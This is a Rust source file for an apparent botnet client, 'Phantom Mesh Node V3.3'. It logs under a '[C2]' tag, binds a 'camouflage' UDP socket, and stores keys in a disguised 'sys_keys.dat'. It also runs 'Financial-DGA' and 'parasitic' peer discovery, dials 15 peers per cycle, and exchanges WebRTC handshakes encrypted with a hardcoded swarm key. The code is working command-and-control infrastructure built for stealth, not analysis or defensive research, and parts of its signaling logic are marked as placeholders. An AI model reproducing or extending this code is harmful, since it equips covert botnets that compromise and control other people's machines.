use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time;
use crate::config::crypto::load_or_generate_keys;
use crate::helpers::paths::get_appdata_dir;
use crate::p2p::webrtc::WebRtcManager;
use crate::p2p::dht::RoutingTable;
use crate::p2p::signaling::{SignalingManager, SignalingCommand};
use protocol::{MeshMsg, Registration, SignalEnvelope};
use crate::logic::flooding::FloodingManager;

struct MeshState {
    dht: RoutingTable,
    webrtc: Arc<WebRtcManager>,
    signaling_tx: mpsc::Sender<SignalingCommand>,
    flooding: Arc<FloodingManager>,
    my_address: String,
    keypair: ed25519_dalek::SigningKey,
}

pub async fn start_client(_bootstrap_override: Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);

    // 1. Bind Camouflage Socket (UDP)
    let udp_socket = crate::host::network::bind_camouflage_socket().await;
    let local_port = udp_socket.local_addr()?.port();
    
    // 2. Setup WebRTC Manager
    let webrtc_manager = Arc::new(WebRtcManager::new());
    
    // 3. Setup Signaling Manager
    let libp2p_key = libp2p::identity::Keypair::generate_ed25519();
    let topic_str = "/phantom/v3/sig/global";
    
    let (signaling, signaling_tx, mut signaling_rx) = SignalingManager::new_with_channel(libp2p_key, topic_str, local_port)?;
    
    // 4. Setup Flooding Manager
    let flooding = Arc::new(FloodingManager::new(webrtc_manager.clone()));
    
    // Run Signaling Loop
    tokio::spawn(async move {
        signaling.run_loop().await;
    });
    
    // Process Incoming Signals (Handshake Logic)
    let webrtc_clone = webrtc_manager.clone();
    let sig_tx_clone = signaling_tx.clone();
    tokio::spawn(async move {
        while let Some((peer_id, envelope)) = signaling_rx.recv().await {
             println!("[C2] Received Signal from {}: Targets={}", peer_id, envelope.targets.len());
             
             // Simplification: Assume we are a target and decipher Payload.
             // Protocol: Payload is encrypted. 
             // Logic: Check if we are in targets.
             // For "Concept Check", we assume the payload *is* the SDP for us.
             // Real logic: Decrypt, extract SDP.
             // If payload starts with "{" (JSON SDP Offer)
             
             // Extract first target payload as "Data" for demo
             if let Some(first) = envelope.targets.first() {
                     // Decrypt Payload using Swarm Key
                     if let Some(decrypted_bytes) = decrypt_payload(&first.encrypted_data) {
                         let sdp_str = String::from_utf8_lossy(&decrypted_bytes).to_string();
                         
                         if sdp_str.contains("\"type\":\"offer\"") {
                             println!("[C2] Detected Offer. Accepting...");
                             match webrtc_clone.accept_connection(&sdp_str).await {
                                 Ok((_pc, answer_sdp)) => {
                                     // Encrypt Answer
                                     let encrypted_answer = encrypt_payload(answer_sdp.as_bytes());
                                     
                                     // Send Answer back
                                     let response = SignalEnvelope {
                                         sender_id: "me".into(),
                                         timestamp: 0,
                                         targets: vec![protocol::TargetPayload {
                                             recipient_id: peer_id.to_string(),
                                             encrypted_data: encrypted_answer, 
                                         }],
                                     };
                                     let _ = sig_tx_clone.send(SignalingCommand::PublishSignal(response)).await;
                                     println!("[C2] Answer Sent (Encrypted).");
                                 },
                                 Err(e) => eprintln!("[C2] WebRTC Error: {}", e),
                             }
                         }
                     } else {
                         // println!("[C2] Failed to decrypt signal from {}", peer_id);
                     }
                 }
        }
    });

    let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
    let my_address = format!("{}:{}", public_ip, local_port);
    println!("[+] Phantom Mesh Node V3.3 Running at: {}", my_address);
    
    // State
    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_address),
        webrtc: webrtc_manager.clone(),
        signaling_tx: signaling_tx.clone(),
        flooding: flooding.clone(),
        my_address: my_address.clone(),
        keypair: identity.keypair.clone(),
    }));

    use crate::discovery::parasitic::ParasiticDiscovery;
    let discovery = ParasiticDiscovery::new();

    // Lifecycle Loop
    let state_discovery = state.clone();
    tokio::spawn(async move {
        time::sleep(Duration::from_secs(5)).await;
        loop {
            println!("[*] Running Financial-DGA Discovery Cycle...");
            match discovery.run_cycle(Some(local_port)).await {
                Ok(peers) => {
                    println!("[+] Discovered {} Potential Neighbors.", peers.len());
                    
                    // Harvest Connections: Dial 15 random peers
                    // Spec 4.2: Select 15 IP targets
                    // We assume peers (SocketAddr) are listening on TCP for Libp2p on same port?
                    // Or we just try.
                    
                    let guard = state_discovery.read().await;
                    let tx = guard.signaling_tx.clone();
                    let webrtc_init = guard.webrtc.clone(); // Clone for initiate
                    drop(guard);
                    
                    // Logic: If neighbor found, we initiate WebRTC Connection? 
                    // Or just dial Libp2p?
                    // Spec says: Libp2p used for Signaling. Then initiate WebRTC over Signaling.
                    // This loop dials Libp2p first.
                    
                    for peer in peers.iter().take(15) {
                         let ip = peer.ip();
                         let port = peer.port();
                         // Construct Multiaddr: /ip4/x.x.x.x/tcp/yyyy
                         let ma_str = format!("/ip4/{}/tcp/{}", ip, port);
                         if let Ok(ma) = ma_str.parse::<libp2p::Multiaddr>() {
                             let _ = tx.send(SignalingCommand::Dial(ma)).await;
                         }
                    }
                    
                    // Initiator Logic (Placeholder for future: once connected via Libp2p, who initiates WebRTC?)
                    // For now, let's assume random initiation or based on PeerID comparison.
                },
                Err(e) => eprintln!("Discovery Error: {}", e),
            }
            time::sleep(Duration::from_secs(60)).await;
        }
    });
    
    // Keep alive
    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

// Encryption Helpers
use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit, Nonce};
use chacha20poly1305::aead::{Aead, AeadCore, OsRng};
use crate::config::constants::SWARM_KEY;

fn encrypt_payload(data: &[u8]) -> Vec<u8> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(SWARM_KEY));
    let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 12 bytes
    
    if let Ok(ciphertext) = cipher.encrypt(&nonce, data) {
        // Prepend Nonce to ciphertext
        let mut result = nonce.to_vec();
        result.extend(ciphertext);
        return result;
    }
    vec![]
}

fn decrypt_payload(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 12 { return None; }
    let cipher = ChaCha20Poly1305::new(Key::from_slice(SWARM_KEY));
    
    let nonce = Nonce::from_slice(&data[0..12]);
    let ciphertext = &data[12..];
    
    cipher.decrypt(nonce, ciphertext).ok()
}

async fn get_public_ip() -> Option<String> { 
    // 1. Try STUN List (Primary)
    let stun_servers = vec![
        "stun.l.google.com:19302",
        "stun1.l.google.com:19302",
        "stun2.l.google.com:19302",
        "stun3.l.google.com:19302",
        "stun4.l.google.com:19302",
    ];

    for server in stun_servers {
        if let Some(ip) = resolve_with_stun(server).await {
            println!("[Network] STUN Success: {} via {}", ip, server);
            return Some(ip);
        }
    }

    // 2. Fallback to HTTP
    println!("[Network] STUN failed, trying HTTP fallback...");
    match reqwest::get("https://api.ipify.org").await {
        Ok(resp) => resp.text().await.ok(),
        Err(_) => {
            // 3. Last Resort
            Some("127.0.0.1".to_string())
        }
    }
}

async fn resolve_with_stun(stun_addr: &str) -> Option<String> {
    use stun::agent::*;
    use stun::client::*;
    use stun::message::*;
    use stun::xoraddr::*;
    use tokio::net::UdpSocket;
    use std::sync::Arc;
    use tokio::sync::mpsc;

    let socket = UdpSocket::bind("0.0.0.0:0").await.ok()?;
    socket.connect(stun_addr).await.ok()?;

    let (handler_tx, mut handler_rx) = mpsc::unbounded_channel();
    
    let mut client = ClientBuilder::new()
        .with_conn(Arc::new(socket))
        .build()
        .ok()?;

    let mut msg = Message::new();
    msg.build(&[Box::new(TransactionId::default()), Box::new(BINDING_REQUEST)]).ok()?;

    // Client::send takes Option<Arc<UnboundedSender<Event>>>
    client.send(&msg, Some(Arc::new(handler_tx))).await.ok()?;

    // Wait short timeout for response
    let event = tokio::time::timeout(Duration::from_millis(1000), handler_rx.recv()).await.ok().flatten()?;
    
    if let Ok(msg) = event.event_body {
         let mut xor_addr = XorMappedAddress::default();
         if xor_addr.get_from(&msg).is_ok() {
              return Some(xor_addr.ip.to_string());
         }
    }
    None
}
